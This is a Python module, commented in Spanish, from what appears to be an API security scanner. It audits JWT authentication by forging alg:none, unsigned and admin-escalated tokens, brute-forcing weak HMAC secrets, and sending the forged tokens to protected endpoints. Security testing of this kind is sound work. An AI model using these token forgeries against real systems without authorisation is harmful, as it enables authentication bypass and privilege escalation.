"""
Modulo JWT Audit — API2 Broken Authentication (OWASP API Security Top 10 2023)
=============================================================================
Prueba 4 ataques sobre tokens JWT para detectar implementaciones debiles:

1. alg:none      — Cambia el algoritmo a 'none' y elimina la firma
2. Firma vacia   — Mantiene header/payload originales pero borra la firma
3. Claim escalation — Modifica claims de privilegio (role, isAdmin, is_admin)
4. Weak secret   — Brute-force local HMAC-SHA256 contra lista de secretos comunes

Diseno: Solo se activa si el auth_token es un JWT (3 partes separadas por '.').
Si la API acepta un token manipulado con respuesta 200 cuando sin token da 401 → CONFIRMADO.

El brute-force de secreto se hace LOCAL (sin requests al target) — 0 ruido en logs del servidor.
"""

import base64
import hmac
import hashlib
import json
import os
from typing import Optional, Dict, List, Any, Tuple

from app.utils.logger import logger  # pyre-ignore[21]


_BUILTIN_WEAK_SECRETS = [
    "secret", "password", "123456", "qwerty", "abc123", "admin",
    "changeme", "mysecret", "jwt_secret", "secret_key", "supersecret",
    "your-256-bit-secret", "topsecret", "jwtkey", "api_secret",
    "app_secret", "flask_secret", "django-insecure-key", "insecure",
    "development", "testing", "staging", "production", "default",
    "token", "auth", "key", "pass", "root", "user", "test",
]

def _load_weak_secrets() -> List[str]:
    """Carga WEAK_SECRETS desde archivo externo o usa la lista integrada."""
    wordlist_path = os.getenv("VAA_JWT_WORDLIST")
    if wordlist_path:
        try:
            with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
                custom = [line.strip() for line in f if line.strip()]
            if custom:
                return custom
        except OSError as e:

            import logging
            logging.getLogger("vaa.jwt").warning(
                f"[JWT] No se pudo leer VAA_JWT_WORDLIST='{wordlist_path}': {e}. "
                f"Usando lista integrada ({len(_BUILTIN_WEAK_SECRETS)} secretos)."
            )
    return _BUILTIN_WEAK_SECRETS

WEAK_SECRETS = _load_weak_secrets()


ESCALATION_CLAIMS = [
    {"role": "admin"},
    {"role": "administrator"},
    {"isAdmin": True},
    {"is_admin": True},
    {"admin": True},
    {"scope": "admin"},
    {"user_type": "admin"},
    {"group": "admin"},
    {"permissions": ["admin", "write", "delete"]},
]


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(s: str) -> bytes:
    padded = s + "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(padded)


def extract_jwt(auth_header: str) -> Optional[str]:
    """
    Extrae el token JWT de un header Authorization: Bearer <token> o de un token directo.
    Retorna None si el token no parece ser un JWT (no tiene 3 partes separadas por '.').
    """
    if not auth_header:
        return None
    parts = auth_header.strip().split()
    token = parts[-1]
    return token if token.count(".") == 2 else None


def _parse_jwt(token: str) -> Tuple[Optional[Dict[str, Any]], Optional[Dict[str, Any]], Optional[str]]:
    """
    Parsea un JWT SIN verificar la firma.
    Retorna (header_dict, payload_dict, signature_b64) o (None, None, None) si error.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return None, None, None
    try:
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception as exc:
        logger.debug(f"[JWT] Error parseando token: {exc}")
        return None, None, None


def _build_token(header: dict, payload: dict, signature: str = "") -> str:
    """Construye un token JWT a partir de sus componentes."""
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{signature}"


class JWTAuditor:
    """
    Audita un token JWT por vulnerabilidades de API2 (Broken Authentication).

    Uso:
        auditor = JWTAuditor("eyJ...")
        if auditor.enabled:
            findings = await auditor.audit(target, "/api/resource", client)
    """

    def __init__(self, token: str):
        self.original_token = token
        
        hdr, pld, sig = _parse_jwt(token)
        if hdr is not None and pld is not None and sig is not None:
            self.header: Dict[str, Any] = hdr
            self.payload: Dict[str, Any] = pld
            self.sig: str = sig
            self.enabled: bool = True
        else:
            self.header: Dict[str, Any] = {}
            self.payload: Dict[str, Any] = {}
            self.sig: str = ""
            self.enabled: bool = False
        if self.enabled:
            alg = self.header.get("alg", "?")
            logger.info(f"[JWT] Token JWT detectado (alg={alg}). Iniciando auditoria JWT...")
        else:
            logger.debug("[JWT] El token de auth no es un JWT valido. Auditoria JWT omitida.")


    def _attack_alg_none(self) -> Dict[str, Any]:
        """Ataque 1: Cambiar algoritmo a 'none' y eliminar firma."""
        none_hdr = dict(self.header)
        none_hdr["alg"] = "none"
        return {
            "name":        "alg_none",
            "token":       _build_token(none_hdr, self.payload, ""),
            "description": "JWT con alg:none — la API acepta tokens sin firma",
            "type_suffix": "alg_none",
        }

    def _attack_empty_signature(self) -> Dict[str, Any]:
        """Ataque 2: Firma vaciada manteniendo el header/payload originales."""
        return {
            "name":        "empty_signature",
            "token":       _build_token(self.header, self.payload, ""),
            "description": "JWT con firma eliminada (header y payload intactos)",
            "type_suffix": "empty_sig",
        }

    def _attacks_claim_escalation(self) -> List[Dict[str, Any]]:
        """Ataque 3: Modificar claims priviledgiados para escalar a admin."""
        attacks = []
        for extra in ESCALATION_CLAIMS:
            key = next(iter(extra))
            escalated_payload = dict(self.payload)
            escalated_payload.update(extra)
            attacks.append({
                "name":        f"claim_escalation_{key}",
                "token":       _build_token(self.header, escalated_payload, "FAKESIG"),
                "description": f"JWT con claim escalado: {extra}",
                "type_suffix": f"claim_{key}",
            })
        return attacks

    def _check_weak_secret(self) -> Optional[Dict[str, Any]]:
        """
        Ataque 4: Brute-force local del secreto HMAC.
        100% local — sin requests al target. Solo aplica a HS256/HS384/HS512.
        Retorna el hallazgo si encuentra el secreto, None si no.
        """
        alg = self.header.get("alg", "").upper()
        if not alg.startswith("HS"):
            return None

        hash_fn = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }.get(alg, hashlib.sha256)
        parts = self.original_token.split(".")
        if len(parts) >= 2:
            signing_input = f"{parts[0]}.{parts[1]}".encode()
        else:
            return None

        for secret in WEAK_SECRETS:
            expected_sig = _b64url_encode(
                hmac.new(secret.encode(), signing_input, hash_fn).digest()
            )
            if expected_sig == self.sig:
                logger.warning(f"[JWT] Secreto debil encontrado: '{secret}'")
                return {
                    "name":        "weak_secret",
                    "token":       self.original_token,
                    "description": f"JWT firmado con secreto debil conocido: '{secret}'",
                    "type_suffix": "weak_secret",
                    "secret":      secret,
                    "weak_secret": True,
                }

        return None

    def generate_attack_tokens(self) -> List[Dict[str, Any]]:
        """Retorna todos los tokens de ataque generados sin hacer requests."""
        if not self.enabled:
            return []

        attacks = [self._attack_alg_none(), self._attack_empty_signature()]
        attacks.extend(self._attacks_claim_escalation())

        weak = self._check_weak_secret()
        if weak:
            attacks.append(weak)

        return attacks


    async def audit(self, target: str, protected_path: str, network_manager: Any) -> List[Dict[str, Any]]:
        """
        Envia los tokens manipulados al endpoint protegido y evalua si la API los acepta.

        Logica:
            1. Verificar que sin token el endpoint devuelve 401/403 (baseline).
            2. Enviar cada token manipulado con Bearer header.
            3. Si la respuesta es 200 \u2192 API2 confirmado.

        Args:
            target:         URL base del target
            protected_path: Path de un endpoint que requiere autenticacion
            network_manager: Instancia de NetworkManager de VAA
        """
        if not self.enabled:
            return []

        findings = []
        base_url = f"{target.rstrip('/')}/{protected_path.lstrip('/')}"


        try:
            baseline = await network_manager.send_request(
                base_url, method="GET", use_pool=False, stealth=False
            )
            if not baseline or baseline.status_code not in (401, 403):
                logger.debug(
                    f"[JWT] Baseline sin-token = {baseline.status_code if baseline else 'ERR'} (no es 401/403). "
                    f"Endpoint no requiere auth \u2014 omitiendo JWT audit en {base_url}."
                )
                return []
        except Exception as e:
            logger.debug(f"[JWT] Error en baseline {base_url}: {e}")
            return []


        for attack in self.generate_attack_tokens():


            if attack.get("weak_secret"):
                findings.append(self._make_finding(base_url, attack, verified_by_request=False))
                continue

            try:

                resp = await network_manager.send_request(
                    base_url,
                    method="GET",
                    custom_headers={"Authorization": f"Bearer {attack['token']}"},
                    use_pool=False,
                    stealth=False
                )
                if resp and resp.status_code == 200:
                    logger.warning(
                        f"[JWT] API acepta token manipulado ({attack['name']}) @ {base_url}"
                    )
                    findings.append(self._make_finding(base_url, attack, resp=resp))

            except Exception as e:
                logger.debug(f"[JWT] Error en ataque '{attack['name']}': {e}")

        if findings:
            logger.warning(f"[JWT] {len(findings)} vuln(s) JWT confirmadas en {base_url}")

        return findings

    @staticmethod
    def _make_finding(url: str, attack: Dict[str, Any], resp: Optional[Any] = None, verified_by_request: bool = True) -> Dict[str, Any]:
        """Construye un hallazgo en formato estandar VAA."""
        is_weak = attack.get("weak_secret", False)
        risk = "Critical"
        return {
            "url":               url,
            "norm_url":          url,
            "type":              f"Broken_Authentication (JWT — {attack['type_suffix']})",
            "method":            "GET",
            "payload":           (attack["token"][:80] + "..." if not is_weak else f"local_bruteforce"),
            "risk":              risk,
            "confidence":        1.0,
            "verified":          True,
            "validation_method": f"jwt_{attack['name']}",
            "report_policy":     "local",
            "params":            {},
            "is_json":           False,
            "response_text":     (resp.text[:300] if resp else attack.get("description", "")),
            "ai_razonamiento":   attack["description"],
            "ai_remediacion": (
                "Rotacion inmediata del secreto JWT con cadena aleatoria de >= 256 bits. "
                "Usar 'openssl rand -hex 32'. Invalidar todos los tokens activos. "
                "Configurar lista blanca de algoritmos — rechazar 'alg:none'. "
                "Usar librerias actualizadas: PyJWT >= 2.x, python-jose."
            )
            if is_weak else (
                "Verificar la firma JWT en CADA request usando la clave correcta. "
                "Nunca aceptar 'alg:none'. Usar lista blanca de algoritmos permitidos. "
                "Librerias recomendadas: PyJWT con algorithms=['HS256'] explicito."
            ),
        }
